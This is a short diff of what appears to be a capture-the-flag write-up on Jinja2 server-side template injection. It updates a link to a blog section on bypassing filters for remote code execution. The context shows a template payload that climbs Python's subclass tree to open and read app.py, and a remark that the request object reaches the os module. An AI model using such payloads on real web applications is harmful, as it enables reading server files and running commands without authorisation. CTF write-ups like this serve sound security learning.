@@ -11,7 +11,7 @@ Same as ssti1 but flag is not in app.py
 {{'abc'.__class__.__base__.__subclasses__()[106].__subclasses__()[0].__subclasses__()[0]('app.py').read()}}
 ```
 
-https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
+https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/#rce-bypassing-as-much-as-i-possibly-can
 
 Using the request object we can get access to the ```os``` module and do some IO.
 
